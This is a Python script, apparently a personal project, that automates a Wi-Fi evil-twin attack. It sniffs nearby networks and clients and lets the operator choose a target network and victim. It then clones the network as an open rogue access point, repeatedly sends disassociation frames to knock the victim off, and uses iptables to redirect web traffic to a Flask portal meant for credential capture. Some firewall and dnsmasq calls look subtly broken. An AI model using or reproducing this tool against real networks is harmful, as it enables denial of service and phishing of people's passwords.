"""
Quest 1: wake the adapter and scan for networks  V
Quest 2: select the network and scan for clients V
Quest 3: create network twin V
Quest 4: send disacossiate packet to victim V
Quest 5: create portal for victim to log

    actions needed:
        1.1. setting the main adapter in monitor mode & injector
        1.2. start channel hopper
        1.3. sniff. for one minute
        1.4. stop channel hopper
        1.5. process the packets
        1.6. save the unique networks
        1.7. display the network with the info : ssid, signal strength, security type, channel...?
        2.1. get user choice for target network after the display
        2.2. isolate the choice as target
        3.1. from the target chosen, sniff the traffic to find unique victims
        3.2. process victims packets
        3.3. display victim list with the info: mac address, connection?, #packets
        4.1. setting the adapter to be a rouge ap-- from monitor to managed
        4.2. set the ip address.
        4.3. create the hostapd.conf --> need dynamic input
        4.4. launch hostapd
        4.5. launch dnsmasq --> static config before the run
        4.6. change firewalls rules ----> need dynamic input --> client & ap mac
        4.7. run flask app web page.
        5.1. send disassociation packet from injector
        

    TO DO => add option to return to target network selection if no victims discovered
            to be able to delete if mistakely click what you not wanted but is an option

"""
# =====================================================================
#                   IMPORTS & CONFIGURATION
# =====================================================================
import os
import sys
import subprocess
import time
import threading
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Disas, sendp
import app

# Interfaces Assignment
EVIL_AP_INTERFACE = "wlxe84e06aed7c3"
INJECT_INTERFACE = "wlxc83a35c2fcb0"
#EVIL_AP_DRIVER = "mt7921u"  --->   left in case needed (edup driver), hostapd accept only the universal driver

# prevent path issue for the config hostapd
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Threads flags
stop_hopper = threading.Event()
stop_injection = threading.Event()

# Global Variables
sniffed_beacons = {}
sniffed_victims = {}

# =====================================================================
#                   SETUPS & CLEAUPS
# =====================================================================


def wakey_wakey_adapter(main_interface): #DONE
    print(f"[*] Starting hardware changes for evil twin")
    try:
        print(f"[*] Clearing background network services to prevent conflicts")
        subprocess.run(["sudo","systemctl", "stop", "NetworkManager"],check=True)
        subprocess.run(["sudo","systemctl","stop","wpa_supplicant"],check=True)
        
        print(f"[*] {main_interface} is going down")
        subprocess.run(["sudo","ip","link","set", main_interface, "down"], check=True)
        #print(f"[*] Changing regulatory domain to add channel 12 & 13")
        #subprocess.run(["sudo","iw","reg","set", "BO"], check=True)
        print(f"[*] Switching {main_interface} to monitor mode")
        subprocess.run(["sudo","iw", main_interface,"set", "type", "monitor"], check=True)
        print(f"[*] Wakey Wakey {main_interface}")
        subprocess.run(["sudo","ip","link","set", main_interface, "up"], check=True)
        print(f"[+] {main_interface} is awake, isolated and locked in Monitor Mode!")
    except subprocess.CalledProcessError as e:
        print(f"[-] Adapter has trouble waking up he says: {e}")
        sys.exit(1)

def starting_r_ap(interface_name):
    print(f"[*] Shifting {interface_name} from Monitor to Managed mode for hostapd.")
    try:
        subprocess.run(["sudo","ip","link","set", interface_name, "down"],check=True)
        subprocess.run(["sudo", "iw", interface_name,"set", "type", "managed"],check=True)
        subprocess.run(["sudo","ip","link","set", interface_name, "up"], check=True)             
        print(f"[+] {interface_name} is awake and locked in Managed Mode!")
        
        print(f" Assigning IP address 192.168.1.1 to {interface_name}")
        subprocess.run(["sudo","ip","addr","replace","192.168.1.1/24","dev", interface_name],check=True)
        print("[+] Gateway IP 192.168.1.1 configured.")
    except subprocess.CalledProcessError as e:
        if "addr" in getattr(e, 'cmd', []):
            print("[!] Note: IP address 192.168.1.1 might already used")
        else:
            print(f"[-] Failed to reconfigure interface : {e}")
            sys.exit(1)

def prepearing_injector(interface_name, channel):
    try:
        print(f"[*] {interface_name} is going down")
        subprocess.run(["sudo","ip","link","set", interface_name, "down"], check=True)   
        print(f"[*] Switching {interface_name} to monitor mode")
        subprocess.run(["sudo","iw", interface_name,"set", "type", "monitor"], check=True)       #change to monitor mode
        subprocess.run(["sudo","ip","link","set", interface_name, "up"], check=True)
        subprocess.run(["sudo", "iw", "dev",interface_name, "set", "channel", str(channel)], check=True)
    except subprocess.CalledProcessError as e:
        cmd_list = getattr(e, 'cmd', [])
        if "channel" in cmd_list:
            print(f"[-] Channel error: {e}")
            sys.exit(1)
        else:
            print(f"[-] {interface_name} failed to change to monitor mode")
            sys.exit(1)


# =====================================================================
#                   BACKGROUND PROCESSES
# =====================================================================

def channel_hopper(interface_name): #DONE
    """
    2.4 GHZ channels 1 to 13, 
    changing the card's frequency every half second.
    (5 GHz is up tp 25+)
    """
    current_channel = 1
    while not stop_hopper.is_set():
        try:
            subprocess.run(["sudo","iw", "dev", interface_name, "set", "channel", str(current_channel)],check=True)
            current_channel = (current_channel % 13) + 1
            #print(f"now in channel {current_channel}")
 
            # Pause for 0.5 seconds or if wake up if stop_hopper.set() and loop break
            if stop_hopper.wait(0.5):
                break
        except subprocess.CalledProcessError as e:
            print(f"[-] Channel hop error to {current_channel}: {e}")

def launch_hostapd(config_path):    #DONEEEE
    print("[*] Launching hostapd process...")
    try:
        # Launch hostapd as a background process using the passed configuration path
        hostapd_proc = subprocess.Popen(
            ["sudo", "hostapd", config_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Give the hardware driver 2 seconds to initialize the radio
        time.sleep(2)
        
        # Check if it crashed immediately (e.g., bad config or driver issue)
        if hostapd_proc.poll() is not None:
            stdout, stderr = hostapd_proc.communicate()
            print(f"[-] hostapd failed to start. Error output:\n{stderr}")
            print(f"[-] hostapd failed to start. Error output:\n{stdout}")
            sys.exit(1)
        print("[+] hostapd is successfully running in the background!")
        print("[+] Your fake access point is now broadcasting.")
        
        # IMPORTANT return the process object so the main script can close it later
        return hostapd_proc
        
    except Exception as e:
        print(f"[-] Failed to execute hostapd: {e}")
        sys.exit(1)

def background_injector(interce_name, target_client, target_bssid): #DONE
    dot11_layer= Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid, FCfield=2)
    disas_layer = Dot11Disas(reason=7)
    disas_packet = RadioTap() / dot11_layer / disas_layer
    
    print("[*] starting background injection")
    
    while not stop_injection.is_set():
        try:
            sendp(disas_packet, iface=INJECT_INTERFACE, count=10, inter=0.1, verbose=False)
            #print("Sending packets")
        
        except Exception as e:
            print(f"Stopped in tryin send de auth packet {e}")
            break
        if stop_injection.wait(2.0):
            break
    print("[*] Injection thread cleanly stopped")

# =====================================================================
#                    USER INPUTS
# =====================================================================

def select_target_ap(sniffed_beacons): #DONE
    
    if not sniffed_beacons:
        print("[-] No network discovered")
    net_target_list = list(sniffed_beacons.keys())
    print("--Discovered Network Targets--")
    for index, (ap, summary) in enumerate(sniffed_beacons.items(), start = 1):
        print(f"{index} \t| BSSID: {ap}\t| SSID {summary['ssid']}\t| CH: {summary['channel']}")
    while True:
        try:
            usr_choice = input("[?] Pick your target: ").strip() #avoid mistakes spacebars
            choice_num = int(usr_choice)
            if 1<=choice_num <= len(net_target_list):
                target_bssid = net_target_list[choice_num - 1]
                return target_bssid
            else:
                print(f"[!] select number between 1 and {len(net_target_list)}")
        except ValueError:
            print("[!] Error: invalid input")

def select_target_victim(sniffed_victims): #DONE
    if not sniffed_victims:
        print("No network discovered")
        sys.exit(1)
    client_target_list = list(sniffed_victims.keys())
    print("--Discovered Clients Targets--")
    for index, (cl, pk) in enumerate(sniffed_victims.items(), start = 1):
        print(f"{index} Client: {cl}\t| Packet : {pk}")
    while True:
        try:
            usr_choice = input("Choose your victim: ").strip()
            choice_num = int(usr_choice)
            if 1<=choice_num <= len(client_target_list):
                target_client = client_target_list[choice_num-1]
                return target_client
            else:
                print(f"select number between 1 and {len(client_target_list)}")
        except ValueError:
            print("Error: invalid input")

#----------------------------------------------------------------------#
"""
filter and save the beacon pkt in dictionary bssid:ssid
for hidden network when the the scond byte under element is length of ssid is 0 or all value in elt.info is 0
"""
def process_sniffed_beacons(packet): #DONE

    
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr3
        #check if already known in set
        if bssid not in sniffed_beacons:
            ssid = "<Hidden SSID>"
            channel = "Unknown"
            
            if packet.haslayer(Dot11Elt) and (elt := packet[Dot11Elt]).ID == 0:
                if elt.len != 0 and not all(byte == 0 for byte in elt.info):
                    # error ignores if the the router broadcasting differently so it won't crash
                    ssid = elt.info.decode('utf-8', errors='ignore')
                    
            #loop to find DS paramenter element in ID 3
            
                current_layer = packet[Dot11Elt]
                while isinstance(current_layer, Dot11Elt):
                    if current_layer.ID == 3:
                        channel = current_layer.info[0]
                        break
                    current_layer = current_layer.payload
            sniffed_beacons[bssid] = {
                "ssid" : ssid,
                "channel" : channel
            }
            print(f"Got: {sniffed_beacons[bssid]}")

def process_sniffed_bssid(packet,bssid): #DONE
    target_bssid = bssid.lower()
    # make sure to have mac header
    if not packet.haslayer(Dot11):
        # DEBUG print("not packet.haslayer(Dot11):")
        return
    dot = packet[Dot11]

    if target_bssid not in [dot.addr1, dot.addr2, dot.addr3]:
        # DEBUG print("in if target_bssid not in [dot.addr1, dot.addr2, dot.addr3]")
        return
    #only for management and control type , type 0 subtypes:  8(beacon) 5(probe response), 11(authentication),
    if dot.type not in [0,2] or (dot.type == 0 and dot.subtype in [5,8,11]):
        # DEBUG print("in if dot.type not in [0,2] or (dot.type == 0 and dot.subtype in [5,8,11] ")
        return
        
    client_mac = None                       #prevent missing creating in no if-- unbound local error
    src_mac = dot.addr2
    dst_mac = dot.addr1
    bssid_mac = dot.addr3
    # DEBUG print(f"client {client_mac}, src {src_mac}, dst {dst_mac}, bssid {bssid_mac}")
    if target_bssid == dst_mac:
        client_mac = src_mac
        #client ---> AP
    elif target_bssid == src_mac:
        #AP---> client
        client_mac = dst_mac
    elif target_bssid == bssid_mac:         #if broadcast/special to AP then from client transmitter and checks not 
        if target_bssid != src_mac:
            client_mac = src_mac
            
    #filer if found client and drop None
    if client_mac:
        #filter again in case of broadcast and IPv6 multicast noise
        if client_mac != "ff:ff:ff:ff:ff:ff" and not client_mac.startswith("33:33"):
            if client_mac not in sniffed_victims:
                sniffed_victims[client_mac] = 0
                print(f"New victim found: {client_mac}")
            sniffed_victims[client_mac] += 1 

def create_hostapd_config(interface, ssid, channel, config_path): #DONE
    #channel = target_bssid_data[target_bssid]["channel"]
    #ssid = target_bssid_data[target_bssid]["ssid"]
    config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wpa=0
"""

    with open(config_path, "w") as f:
        f.write(config_content)
    
    if os.path.exists(config_path) and os.path.getsize(config_path) > 0:
        print("[+] hostapd configuration file generated successfully.")
    else:
        print("[-] ERROR: Failed to create conf file. Check directory permissions.")


# =====================================================================
#                       LOGIN PORTAL
# =====================================================================
def setup_network():
    print("[*] Configuring firewall rules...")
    print("[*] Stopping existing dnsmasq..")

    try:
        subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], check=True)
        print("[*] Launching dnsmasq")
        subprocess.run(["sudo","dnsmasq", "-C", "/etc/dnsmasq.conf", "-d"], check=True)
        # enable IP forwarding in the Linux kernel
        subprocess.run(["sudo","sysctl", "-w","net.ipv4.ip_forward=1"], check=True)
        # custom firewall chain 
        subprocess.run(["sudo","iptables","-t","mangle", "-N", "captive_portal"], check=True)
        # all traffic from EVIL AP go to captive portal chain
        subprocess.run(["sudo","iptables","-t","mangle", "-A", "PREROUTING", "-i", EVIL_AP_INTERFACE, "-j", "captive_portal"], check=True)
        # intercept web traffic port 80 - to flask
        subprocess.run(["sudo","iptables","-t","nat", "-A", "PREROUTING", "-i", EVIL_AP_INTERFACE, "-p", "tcp", "--dport", "80", "-m", "mangle", "!", "--mark", "1", "-j", "DNAT", "--to-destination" "192.168.1.1:5000"], check=True)
        # drop traffic for not logged it users
        subprocess.run(["sudo","iptables","-A","FORWARD", "-i", EVIL_AP_INTERFACE, "-m", "mangle", "!", "--mark", "1", "-j", "DROP"], check=True)
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Firewall configuration failed: {e}")
        exit(1)

    app.run(host='0.0.0.0', port=80)


# =====================================================================
#                       MAIN
# =====================================================================

if __name__ == "__main__":
# STAGE 0.1 Preparations
       
# STAGE 1 Scanning for nnearby networks.
# 1.1 Setting up the adapter for monitor mode
    wakey_wakey_adapter(EVIL_AP_INTERFACE)
    
    hopper_thread = threading.Thread(target=channel_hopper, args=(EVIL_AP_INTERFACE,), daemon=True)
    hopper_thread.start()

# 1.2 Sniffing & filtering for beacon packets of nearby networks
    print("[*] Sniffing started, lookout AP's")
    sniff(iface=EVIL_AP_INTERFACE, prn=process_sniffed_beacons, store=False, timeout=30)    
    print("[*] Sniffing finished")
    
# STAGE 2 Target network selection    
    target_bssid = select_target_ap(sniffed_beacons)
    ssid= sniffed_beacons[target_bssid].get("ssid", "Unknown_Network")
    channel = sniffed_beacons[target_bssid].get("channel", "1")
    print(f"[*] You chose as target: BSSID: {target_bssid} -> {sniffed_beacons[target_bssid]}")
    
    stop_hopper.set()
    time.sleep(0.1)
    
# STAGE 3 Victim identification
# 3.1 Setting channel to target channel  
    subprocess.run(["sudo","iw","dev", EVIL_AP_INTERFACE,"set", "channel", str(channel)], check=True)
    print("[*] Sniffing for victim traffic")
# 3.2 Sniffing traffic to & from target network
    sniff(iface=EVIL_AP_INTERFACE, prn=lambda pkt: process_sniffed_bssid(pkt,target_bssid), store=False, count=50) #change for timeout after done testing
# 3.3 Selecting victim    
    target_client = select_target_victim(sniffed_victims)
    print(f"You chose as victim the Client: {target_client} with {sniffed_victims[target_client]} packets sent")
    stop_hopper.clear()


# STAGE 4 Creating evil twin of target network
# 4.1 Creating hostapd config file
    config_path = os.path.join(SCRIPT_DIR, "temp_hostapd.conf")
    create_hostapd_config(EVIL_AP_INTERFACE, ssid, channel, config_path)
# 4.2 Changing main interface to managed to AP, shifting second interface for monitor
    starting_r_ap(EVIL_AP_INTERFACE)
    prepearing_injector(INJECT_INTERFACE, channel)
    
    ap_process = launch_hostapd(config_path)


# STAGE 5 Victim disconnection    
    injection_thread = threading.Thread(target=background_injector,args=(INJECT_INTERFACE, target_client,target_bssid),daemon=True)
    injection_thread.start()

# STAGE 6 Credential capture
# 6 the user dns need to point to the evil twin 
    setup_network()
# STAGE 0.2 Cleaners
    input("\n[*] Press Enter to shut down the Rouge AP..")
    print("[*] Terminating hostapd")
    ap_process.terminate()
    ap_process.wait()
    print("[+] Clean hostapd shutdown")
    #returning the NetworkManager and Wi-fi negotiator
    # Call this at the very end of your script to restore normal Wi-Fi use
    print("[*] Restoring normal network services...")
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"])
    # wpa_supplicant usually starts automatically alongside NetworkManager

